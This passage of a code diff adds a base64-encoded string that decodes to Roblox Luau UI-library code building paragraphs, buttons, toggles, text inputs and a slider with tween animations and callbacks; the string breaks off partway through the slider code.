+.."ICAgICAgICAgICAgICAgbGJsLlRleHRTaXplICAgICAgICAgICAgICAgPSAxMQogICAgICAgICAgICAgICAgbGJsLlRleHRYQWxp
+.."Z25tZW50ICAgICAgICAgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICAgICAgICAgIGxibC5UZXh0V3JhcHBlZCAg
+.."ICAgICAgICAgID0gdHJ1ZQogICAgICAgICAgICAgICAgcmV0dXJuIGxibAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGZ1
+.."bmN0aW9uIHRhYjpDcmVhdGVQYXJhZ3JhcGgob3B0czIpCiAgICAgICAgICAgICAgICBvcHRzMiA9IG9wdHMyIG9yIHt9CiAgICAg
+.."ICAgICAgICAgICBsb2NhbCBjb250ZW50MiA9IG9wdHMyLkNvbnRlbnQgb3IgIiIKICAgICAgICAgICAgICAgIGxvY2FsIGxpbmVD
+.."b3VudCA9IDAKICAgICAgICAgICAgICAgIGZvciBfIGluIGNvbnRlbnQyOmdtYXRjaCgiW15cbl0rIikgZG8gbGluZUNvdW50ID0g
+.."bGluZUNvdW50ICsgMSBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIGggPSAyOCArIG1hdGgubWF4KGxpbmVDb3VudCwgMSkgKiAx
+.."MwogICAgICAgICAgICAgICAgbG9jYWwgZiA9IG1ha2VFbGVtKHNjcm9sbCwgaCkKICAgICAgICAgICAgICAgIGYuTGF5b3V0T3Jk
+.."ZXIgPSBuZXh0T3JkZXIoKQogICAgICAgICAgICAgICAgbG9jYWwgdGwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGYpCiAg
+.."ICAgICAgICAgICAgICB0bC5TaXplICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMTgpCiAgICAgICAg
+.."ICAgICAgICB0bC5Qb3NpdGlvbiAgICAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDYsIDAsIDQpCiAgICAgICAgICAgICAgICB0
+.."bC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgdGwuVGV4dCAgICAgICAgICAgICAgICAgICA9IG9w
+.."dHMyLlRpdGxlIG9yICIiCiAgICAgICAgICAgICAgICB0bC5UZXh0Q29sb3IzICAgICAgICAgICAgID0gQ19URVhUCiAgICAgICAg
+.."ICAgICAgICB0bC5Gb250ICAgICAgICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICAgICAgICAgIHRs
+.."LlRleHRTaXplICAgICAgICAgICAgICAgPSAxMgogICAgICAgICAgICAgICAgdGwuVGV4dFhBbGlnbm1lbnQgICAgICAgICA9IEVu
+.."dW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICAgICAgbG9jYWwgY2wgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIs
+.."IGYpCiAgICAgICAgICAgICAgICBjbC5TaXplICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC0xMCwgMSwgLTIyKQog
+.."ICAgICAgICAgICAgICAgY2wuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCA2LCAwLCAyMikKICAgICAgICAg
+.."ICAgICAgIGNsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICBjbC5UZXh0ICAgICAgICAgICAgICAg
+.."ICAgID0gY29udGVudDIKICAgICAgICAgICAgICAgIGNsLlRleHRDb2xvcjMgICAgICAgICAgICAgPSBDX1NVQgogICAgICAgICAg
+.."ICAgICAgY2wuRm9udCAgICAgICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgIGNsLlRleHRT
+.."aXplICAgICAgICAgICAgICAgPSAxMQogICAgICAgICAgICAgICAgY2wuVGV4dFhBbGlnbm1lbnQgICAgICAgICA9IEVudW0uVGV4
+.."dFhBbGlnbm1lbnQuTGVmdAogICAgICAgICAgICAgICAgY2wuVGV4dFdyYXBwZWQgICAgICAgICAgICA9IHRydWUKICAgICAgICAg
+.."ICAgZW5kCgogICAgICAgICAgICBmdW5jdGlvbiB0YWI6Q3JlYXRlQnV0dG9uKG9wdHMyKQogICAgICAgICAgICAgICAgb3B0czIg
+.."PSBvcHRzMiBvciB7fQogICAgICAgICAgICAgICAgbG9jYWwgZiA9IG1ha2VFbGVtKHNjcm9sbCwgMzQpCiAgICAgICAgICAgICAg
+.."ICBmLkxheW91dE9yZGVyID0gbmV4dE9yZGVyKCkKICAgICAgICAgICAgICAgIGxvY2FsIGJhciA9IEluc3RhbmNlLm5ldygiRnJh
+.."bWUiLCBmKQogICAgICAgICAgICAgICAgYmFyLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMCwgMywgMC42LCAwKQogICAg
+.."ICAgICAgICAgICAgYmFyLlBvc2l0aW9uICAgICAgICAgPSBVRGltMi5uZXcoMCwgMCwgMC4yLCAwKQogICAgICAgICAgICAgICAg
+.."YmFyLkJhY2tncm91bmRDb2xvcjMgPSBDX0FDQ0VOVAogICAgICAgICAgICAgICAgYmFyLkJvcmRlclNpemVQaXhlbCAgPSAwCiAg
+.."ICAgICAgICAgICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgYmFyKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAyKQog
+.."ICAgICAgICAgICAgICAgbG9jYWwgYnRuMiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIGYpCiAgICAgICAgICAgICAgICBi
+.."dG4yLlNpemUgICAgICAgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICAgICAgICAgIGJ0bjIuQmFj
+.."a2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIGJ0bjIuVGV4dCAgICAgICAgICAgICAgICAgICA9IG9wdHMy
+.."Lk5hbWUgb3IgIkJ1dHRvbiIKICAgICAgICAgICAgICAgIGJ0bjIuVGV4dENvbG9yMyAgICAgICAgICAgICA9IENfVEVYVAogICAg
+.."ICAgICAgICAgICAgYnRuMi5Gb250ICAgICAgICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhhbVNlbWlib2xkCiAgICAgICAg
+.."ICAgICAgICBidG4yLlRleHRTaXplICAgICAgICAgICAgICAgPSAxMgogICAgICAgICAgICAgICAgYnRuMi5Nb3VzZUJ1dHRvbjFD
+.."bGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGYsIFR3ZWVuSW5m
+.."by5uZXcoMC4wOCksIHsgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDM2LDM2LDUwKSB9KTpQbGF5KCkKICAgICAg
+.."ICAgICAgICAgICAgICB0YXNrLmRlbGF5KDAuMTYsIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2
+.."aWNlOkNyZWF0ZShmLCBUd2VlbkluZm8ubmV3KDAuMTIpLCB7IEJhY2tncm91bmRDb2xvcjMgPSBDX0VMRU1fQkcgfSk6UGxheSgp
+.."CiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgIGlmIG9wdHMyLkNhbGxiYWNrIHRoZW4gdGFzay5z
+.."cGF3bihvcHRzMi5DYWxsYmFjaykgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBidG4yLk1vdXNlRW50
+.."ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShmLCBUd2VlbkluZm8u
+.."bmV3KDAuMSksIHsgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDM0LDM0LDQ0KSB9KTpQbGF5KCkKICAgICAgICAg
+.."ICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGJ0bjIuTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAg
+.."ICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGYsIFR3ZWVuSW5mby5uZXcoMC4xKSwgeyBCYWNrZ3JvdW5kQ29sb3IzID0gQ19F
+.."TEVNX0JHIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgcmV0dXJuIGJ0bjIKICAgICAgICAg
+.."ICAgZW5kCgogICAgICAgICAgICBmdW5jdGlvbiB0YWI6Q3JlYXRlVG9nZ2xlKG9wdHMyKQogICAgICAgICAgICAgICAgb3B0czIg
+.."PSBvcHRzMiBvciB7fQogICAgICAgICAgICAgICAgbG9jYWwgdmFsID0gb3B0czIuQ3VycmVudFZhbHVlIG9yIGZhbHNlCiAgICAg
+.."ICAgICAgICAgICBsb2NhbCBmICAgPSBtYWtlRWxlbShzY3JvbGwsIDM0KQogICAgICAgICAgICAgICAgZi5MYXlvdXRPcmRlciA9
+.."IG5leHRPcmRlcigpCiAgICAgICAgICAgICAgICBsb2NhbCBsYmwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGYpCiAgICAg
+.."ICAgICAgICAgICBsYmwuU2l6ZSAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAtNTAsIDEsIDApCiAgICAgICAgICAg
+.."ICAgICBsYmwuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCA4LCAwLCAwKQogICAgICAgICAgICAgICAgbGJs
+.."LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICBsYmwuVGV4dCAgICAgICAgICAgICAgICAgICA9IG9w
+.."dHMyLk5hbWUgb3IgIlRvZ2dsZSIKICAgICAgICAgICAgICAgIGxibC5UZXh0Q29sb3IzICAgICAgICAgICAgID0gQ19URVhUCiAg
+.."ICAgICAgICAgICAgICBsYmwuRm9udCAgICAgICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAg
+.."IGxibC5UZXh0U2l6ZSAgICAgICAgICAgICAgID0gMTIKICAgICAgICAgICAgICAgIGxibC5UZXh0WEFsaWdubWVudCAgICAgICAg
+.."ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CiAgICAgICAgICAgICAgICBsb2NhbCB0cmFjayA9IEluc3RhbmNlLm5ldygiRnJh
+.."bWUiLCBmKQogICAgICAgICAgICAgICAgdHJhY2suU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCAzNCwgMCwgMTgpCiAg
+.."ICAgICAgICAgICAgICB0cmFjay5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDEsIC00MiwgMC41LCAtOSkKICAgICAgICAg
+.."ICAgICAgIHRyYWNrLkJhY2tncm91bmRDb2xvcjMgPSB2YWwgYW5kIENfVE9HX09OIG9yIENfVE9HX09GRgogICAgICAgICAgICAg
+.."ICAgdHJhY2suQm9yZGVyU2l6ZVBpeGVsICA9IDAKICAgICAgICAgICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCB0cmFj
+.."aykuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKICAgICAgICAgICAgICAgIGxvY2FsIGtub2IgPSBJbnN0YW5jZS5uZXco
+.."IkZyYW1lIiwgdHJhY2spCiAgICAgICAgICAgICAgICBrbm9iLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMCwgMTQsIDAs
+.."IDE0KQogICAgICAgICAgICAgICAga25vYi5Qb3NpdGlvbiAgICAgICAgID0gdmFsIGFuZCBVRGltMi5uZXcoMSwtMTYsMC41LC03
+.."KSBvciBVRGltMi5uZXcoMCwyLDAuNSwtNykKICAgICAgICAgICAgICAgIGtub2IuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5m
+.."cm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICBrbm9iLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICAgICAgICAg
+.."ICAgICBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwga25vYikuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKICAgICAgICAg
+.."ICAgICAgIGxvY2FsIGNCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBmKQogICAgICAgICAgICAgICAgY0J0bi5TaXpl
+.."ICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICAgICAgICAgICAgICBjQnRuLkJhY2tncm91bmRU
+.."cmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICBjQnRuLlRleHQgICAgICAgICAgICAgICAgICAgPSAiIgogICAgICAgICAg
+.."ICAgICAgY0J0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICB2YWwgPSBu
+.."b3QgdmFsCiAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0cmFjaywgVHdlZW5JbmZvLm5ldygwLjE0KSwg
+.."eyBCYWNrZ3JvdW5kQ29sb3IzID0gdmFsIGFuZCBDX1RPR19PTiBvciBDX1RPR19PRkYgfSk6UGxheSgpCiAgICAgICAgICAgICAg
+.."ICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShrbm9iLCBUd2VlbkluZm8ubmV3KDAuMTQpLCB7CiAgICAgICAgICAgICAgICAgICAg
+.."ICAgIFBvc2l0aW9uID0gdmFsIGFuZCBVRGltMi5uZXcoMSwtMTYsMC41LC03KSBvciBVRGltMi5uZXcoMCwyLDAuNSwtNykKICAg
+.."ICAgICAgICAgICAgICAgICB9KTpQbGF5KCkKICAgICAgICAgICAgICAgICAgICBpZiBvcHRzMi5DYWxsYmFjayB0aGVuIHRhc2su
+.."c3Bhd24ob3B0czIuQ2FsbGJhY2ssIHZhbCkgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBjQnRuLk1v
+.."dXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShmLCBUd2Vl
+.."bkluZm8ubmV3KDAuMSksIHsgQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMyLDMyLDQyKSB9KTpQbGF5KCkKICAg
+.."ICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGNCdG4uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAg
+.."ICAgICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGYsIFR3ZWVuSW5mby5uZXcoMC4xKSwgeyBCYWNrZ3JvdW5kQ29sb3Iz
+.."ID0gQ19FTEVNX0JHIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgbG9jYWwgdG9nT2JqID0g
+.."e30KICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHRvZ09iajpTZXRWYWx1ZSh2KQogICAgICAgICAgICAgICAgICAgIHZhbCA9IHYK
+.."ICAgICAgICAgICAgICAgICAgICB0cmFjay5CYWNrZ3JvdW5kQ29sb3IzID0gdiBhbmQgQ19UT0dfT04gb3IgQ19UT0dfT0ZGCiAg
+.."ICAgICAgICAgICAgICAgICAga25vYi5Qb3NpdGlvbiA9IHYgYW5kIFVEaW0yLm5ldygxLC0xNiwwLjUsLTcpIG9yIFVEaW0yLm5l
+.."dygwLDIsMC41LC03KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICByZXR1cm4gdG9nT2JqCiAgICAgICAgICAg
+.."IGVuZAoKICAgICAgICAgICAgZnVuY3Rpb24gdGFiOkNyZWF0ZUlucHV0KG9wdHMyKQogICAgICAgICAgICAgICAgb3B0czIgPSBv
+.."cHRzMiBvciB7fQogICAgICAgICAgICAgICAgbG9jYWwgZiA9IG1ha2VFbGVtKHNjcm9sbCwgNTIpCiAgICAgICAgICAgICAgICBm
+.."LkxheW91dE9yZGVyID0gbmV4dE9yZGVyKCkKICAgICAgICAgICAgICAgIGxvY2FsIGxibCA9IEluc3RhbmNlLm5ldygiVGV4dExh
+.."YmVsIiwgZikKICAgICAgICAgICAgICAgIGxibC5TaXplICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC0xMCwgMCwg
+.."MjApCiAgICAgICAgICAgICAgICBsYmwuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCA4LCAwLCA0KQogICAg
+.."ICAgICAgICAgICAgbGJsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICBsYmwuVGV4dCAgICAgICAg
+.."ICAgICAgICAgICA9IG9wdHMyLk5hbWUgb3IgIklucHV0IgogICAgICAgICAgICAgICAgbGJsLlRleHRDb2xvcjMgICAgICAgICAg
+.."ICAgPSBDX1RFWFQKICAgICAgICAgICAgICAgIGxibC5Gb250ICAgICAgICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhhbQog
+.."ICAgICAgICAgICAgICAgbGJsLlRleHRTaXplICAgICAgICAgICAgICAgPSAxMgogICAgICAgICAgICAgICAgbGJsLlRleHRYQWxp
+.."Z25tZW50ICAgICAgICAgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICAgICAgICAgIGxvY2FsIGhvbGRlciA9IElu
+.."c3RhbmNlLm5ldygiRnJhbWUiLCBmKQogICAgICAgICAgICAgICAgaG9sZGVyLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXco
+.."MSwgLTE2LCAwLCAyNCkKICAgICAgICAgICAgICAgIGhvbGRlci5Qb3NpdGlvbiAgICAgICAgID0gVURpbTIubmV3KDAsIDgsIDAs
+.."IDIyKQogICAgICAgICAgICAgICAgaG9sZGVyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMywgMTMsIDE3KQog
+.."ICAgICAgICAgICAgICAgaG9sZGVyLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICAgICAgICAgICAgICBJbnN0YW5jZS5uZXcoIlVJ
+.."Q29ybmVyIiwgaG9sZGVyKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCA1KQogICAgICAgICAgICAgICAgbG9jYWwgaVN0cm9r
+.."ZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBob2xkZXIpCiAgICAgICAgICAgICAgICBpU3Ryb2tlLlRoaWNrbmVzcyA9IDEK
+.."ICAgICAgICAgICAgICAgIGlTdHJva2UuQ29sb3IgICAgID0gQ29sb3IzLmZyb21SR0IoNDYsIDQ2LCA2MikKICAgICAgICAgICAg
+.."ICAgIGxvY2FsIHRiID0gSW5zdGFuY2UubmV3KCJUZXh0Qm94IiwgaG9sZGVyKQogICAgICAgICAgICAgICAgdGIuU2l6ZSAgICAg
+.."ICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAtOCwgMSwgMCkKICAgICAgICAgICAgICAgIHRiLlBvc2l0aW9uICAgICAgICAg
+.."ICAgICAgPSBVRGltMi5uZXcoMCwgNCwgMCwgMCkKICAgICAgICAgICAgICAgIHRiLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAx
+.."CiAgICAgICAgICAgICAgICB0Yi5UZXh0ICAgICAgICAgICAgICAgICAgID0gIiIKICAgICAgICAgICAgICAgIHRiLlBsYWNlaG9s
+.."ZGVyVGV4dCAgICAgICAgPSBvcHRzMi5QbGFjZWhvbGRlclRleHQgb3IgIiIKICAgICAgICAgICAgICAgIHRiLlBsYWNlaG9sZGVy
+.."Q29sb3IzICAgICAgPSBDb2xvcjMuZnJvbVJHQig4NSwgODUsIDEwNSkKICAgICAgICAgICAgICAgIHRiLlRleHRDb2xvcjMgICAg
+.."ICAgICAgICAgPSBDX1RFWFQKICAgICAgICAgICAgICAgIHRiLkZvbnQgICAgICAgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290
+.."aGFtCiAgICAgICAgICAgICAgICB0Yi5UZXh0U2l6ZSAgICAgICAgICAgICAgID0gMTIKICAgICAgICAgICAgICAgIHRiLlRleHRY
+.."QWxpZ25tZW50ICAgICAgICAgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQKICAgICAgICAgICAgICAgIHRiLkNsZWFyVGV4dE9u
+.."Rm9jdXMgICAgICAgPSBmYWxzZQogICAgICAgICAgICAgICAgdGIuQ2xpcHNEZXNjZW5kYW50cyAgICAgICA9IHRydWUKICAgICAg
+.."ICAgICAgICAgIHRiLkZvY3VzZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNy
+.."ZWF0ZShpU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMTIpLCB7IENvbG9yID0gQ19BQ0NFTlQgfSk6UGxheSgpCiAgICAgICAgICAg
+.."ICAgICBlbmQpCiAgICAgICAgICAgICAgICB0Yi5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAg
+.."ICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShpU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMTIpLCB7IENvbG9yID0gQ29sb3IzLmZyb21S
+.."R0IoNDYsNDYsNjIpIH0pOlBsYXkoKQogICAgICAgICAgICAgICAgICAgIGlmIG9wdHMyLlJlbW92ZVRleHRBZnRlckZvY3VzTG9z
+.."dCB0aGVuIHRiLlRleHQgPSAiIiBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBvcHRzMi5DYWxsYmFjayB0aGVuIHRhc2suc3Bh
+.."d24ob3B0czIuQ2FsbGJhY2ssIHRiLlRleHQpIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgcmV0dXJu
+.."IHRiCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgZnVuY3Rpb24gdGFiOkNyZWF0ZVNsaWRlcihvcHRzMikKICAgICAgICAg
+.."ICAgICAgIG9wdHMyID0gb3B0czIgb3Ige30KICAgICAgICAgICAgICAgIGxvY2FsIHJNaW4gPSAob3B0czIuUmFuZ2UgYW5kIG9w
+.."dHMyLlJhbmdlWzFdKSBvciAwCiAgICAgICAgICAgICAgICBsb2NhbCByTWF4ID0gKG9wdHMyLlJhbmdlIGFuZCBvcHRzMi5SYW5n
+.."ZVsyXSkgb3IgMTAwCiAgICAgICAgICAgICAgICBsb2NhbCBpbmMgID0gb3B0czIuSW5jcmVtZW50IG9yIDEKICAgICAgICAgICAg
+.."ICAgIGxvY2FsIHNWYWwgPSBvcHRzMi5DdXJyZW50VmFsdWUgb3Igck1pbgogICAgICAgICAgICAgICAgbG9jYWwgZiAgICA9IG1h
+.."a2VFbGVtKHNjcm9sbCwgNTIpCiAgICAgICAgICAgICAgICBmLkxheW91dE9yZGVyID0gbmV4dE9yZGVyKCkKICAgICAgICAgICAg
+.."ICAgIGxvY2FsIGxibCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgZikKICAgICAgICAgICAgICAgIGxibC5TaXplICAgICAg
+.."ICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIC01NSwgMCwgMjApCiAgICAgICAgICAgICAgICBsYmwuUG9zaXRpb24gICAgICAg
+.."ICAgICAgICA9IFVEaW0yLm5ldygwLCA4LCAwLCA0KQogICAgICAgICAgICAgICAgbGJsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kg
+.."PSAxCiAgICAgICAgICAgICAgICBsYmwuVGV4dCAgICAgICAgICAgICAgICAgICA9IG9wdHMyLk5hbWUgb3IgIlNsaWRlciIKICAg
+.."ICAgICAgICAgICAgIGxibC5UZXh0Q29sb3IzICAgICAgICAgICAgID0gQ19URVhUCiAgICAgICAgICAgICAgICBsYmwuRm9udCAg
+.."ICAgICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW0KICAgICAgICAgICAgICAgIGxibC5UZXh0U2l6ZSAgICAgICAgICAg
+.."ICAgID0gMTIKICAgICAgICAgICAgICAgIGxibC5UZXh0WEFsaWdubWVudCAgICAgICAgID0gRW51bS5UZXh0WEFsaWdubWVudC5M
+.."ZWZ0CiAgICAgICAgICAgICAgICBsb2NhbCB2YWxMYmwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGYpCiAgICAgICAgICAg
+.."ICAgICB2YWxMYmwuU2l6ZSAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygwLCA1MCwgMCwgMjApCiAgICAgICAgICAgICAg
+.."ICB2YWxMYmwuUG9zaXRpb24gICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAtNTQsIDAsIDQpCiAgICAgICAgICAgICAgICB2
+.."YWxMYmwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgICAgICAgICAgICAgIHZhbExibC5UZXh0ICAgICAgICAgICAgICAg
+.."ICAgID0gdG9zdHJpbmcoc1ZhbCkKICAgICAgICAgICAgICAgIHZhbExibC5UZXh0Q29sb3IzICAgICAgICAgICAgID0gQ19BQ0NF
+.."TlQKICAgICAgICAgICAgICAgIHZhbExibC5Gb250ICAgICAgICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAg
+.."ICAgICAgICAgICAgIHZhbExibC5UZXh0U2l6ZSAgICAgICAgICAgICAgID0gMTEKICAgICAgICAgICAgICAgIHZhbExibC5UZXh0
+.."WEFsaWdubWVudCAgICAgICAgID0gRW51bS5UZXh0WEFsaWdubWVudC5SaWdodAogICAgICAgICAgICAgICAgbG9jYWwgdHJhY2tC
+.."RyA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBmKQogICAgICAgICAgICAgICAgdHJhY2tCRy5TaXplICAgICAgICAgICAgID0gVURp
+.."bTIubmV3KDEsIC0xNiwgMCwgNSkKICAgICAgICAgICAgICAgIHRyYWNrQkcuUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygw
+.."LCA4LCAwLCAzNCkKICAgICAgICAgICAgICAgIHRyYWNrQkcuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDM4LCAz
+.."OCwgNTIpCiAgICAgICAgICAgICAgICB0cmFja0JHLkJvcmRlclNpemVQaXhlbCAgPSAwCiAgICAgICAgICAgICAgICBJbnN0YW5j
+.."ZS5uZXcoIlVJQ29ybmVyIiwgdHJhY2tCRykuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMSwgMCkKICAgICAgICAgICAgICAgIGxv
+.."Y2FsIGZpbGwgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgdHJhY2tCRykKICAgICAgICAgICAgICAgIGZpbGwuU2l6ZSAgICAgICAg
+.."ICAgICA9IFVEaW0yLm5ldygoc1ZhbC1yTWluKS9tYXRoLm1heChyTWF4LXJNaW4sMC4wMDEpLCAwLCAxLCAwKQogICAgICAgICAg
+.."ICAgICAgZmlsbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ19BQ0NFTlQKICAgICAgICAgICAgICAgIGZpbGwuQm9yZGVyU2l6ZVBpeGVs
+.."ICA9IDAKICAgICAgICAgICAgICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBmaWxsKS5Db3JuZXJSYWRpdXMgPSBVRGltLm5l
+.."dygxLCAwKQogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gc2V0U1ZhbCh2KQogICAgICAgICAgICAgICAgICAgIHYgPSBt
+.."YXRoLmNsYW1wKG1hdGguZmxvb3Iodi9pbmMrMC41KSppbmMsIHJNaW4sIHJNYXgpCiAgICAgICAgICAgICAgICAgICAgc1ZhbCA9
+.."IHYKICAgICAgICAgICAgICAgICAgICB2YWxMYmwuVGV4dCA9IHRvc3RyaW5nKHYpCiAgICAgICAgICAgICAgICAgICAgZmlsbC5T
+.."aXplID0gVURpbTIubmV3KCh2LXJNaW4pL21hdGgubWF4KHJNYXgtck1pbiwwLjAwMSksIDAsIDEsIDApCiAgICAgICAgICAgICAg
+.."ICAgICAgaWYgb3B0czIuQ2FsbGJhY2sgdGhlbiB0YXNrLnNwYXduKG9wdHMyLkNhbGxiYWNrLCB2KSBlbmQKICAgICAgICAgICAg
+.."ICAgIGVuZAogICAgICAgICAgICAgICAgbG9jYWwgc2xpZGluZyA9IGZhbHNlCiAgICAgICAgICAgICAgICBsb2NhbCBoaXRib3gg
+.."PSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCB0cmFja0JHKQogICAgICAgICAgICAgICAgaGl0Ym94LlNpemUgICAgICAgICAg
+.."ICAgICAgICAgPSBVRGltMi5uZXcoMSwgMCwgMCwgMTYpCiAgICAgICAgICAgICAgICBoaXRib3guUG9zaXRpb24gICAgICAgICAg
+.."ICAgICA9IFVEaW0yLm5ldygwLCAwLCAwLjUsIC04KQogICAgICAgICAgICAgICAgaGl0Ym94LkJhY2tncm91bmRUcmFuc3BhcmVu
+.."Y3kgPSAxCiAgICAgICAgICAgICAgICBoaXRib3guVGV4dCAgICAgICAgICAgICAgICAgICA9ICIiCiAgICAgICAgICAgICAgICBo
